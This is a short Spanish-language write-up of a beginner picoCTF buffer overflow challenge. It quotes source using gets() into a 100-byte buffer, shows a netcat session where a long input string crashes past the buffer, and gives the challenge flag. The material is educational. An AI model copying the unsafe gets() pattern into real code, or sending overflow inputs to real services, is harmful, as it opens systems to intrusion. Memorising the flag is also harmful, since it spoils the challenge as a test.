## Descripción

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:`nc saturn.picoctf.net 51532`

## Pistas

1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución

```python()
1. Analizamos el código fuente.
2. Encontramos las siguientes instrucciones:
printf("Input: ");
fflush(stdout);
char buf1[100];
gets(buf1); 
vuln(buf1);
printf("The program will exit now\n");
3. Analizando lo anterior, vemos como lo que se introduce por medio de la terminal se guarda en un arreglo de 100 caracteres, por lo que ahí hay una bulneravidad.
4. Debido a que no hay un control de errores, podemos introduccir más caracteres de los que se aceptan.
5. Introducimos muchos caracteres:

└─$ nc saturn.picoctf.net 51532

Input: 0000000000000000000000000000000000000000000000000000000000000000
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
6. Al romperse esta cantidad, se nos muestra la bandera.

```

## Bandera

picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

## Notas adicionales